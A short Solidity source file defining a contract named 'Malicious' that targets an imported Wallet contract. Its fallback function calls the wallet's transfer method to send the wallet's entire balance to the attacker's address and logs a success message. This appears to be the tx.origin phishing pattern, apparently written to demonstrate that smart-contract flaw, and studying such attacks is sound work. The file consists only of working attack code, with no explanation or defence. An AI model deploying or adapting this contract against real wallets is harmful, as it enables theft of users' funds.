// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import './wallet.sol';

contract Malicious {

    address payable public owner;
    event Log(string message);

    Wallet wallet;

    constructor(Wallet _wallet) {
        wallet = Wallet(_wallet);
        owner = payable(msg.sender);
    }

    fallback () external {
        wallet.transfer(owner, address(wallet).balance);
        emit Log("Malicious fallback was succesfully called");
    }
}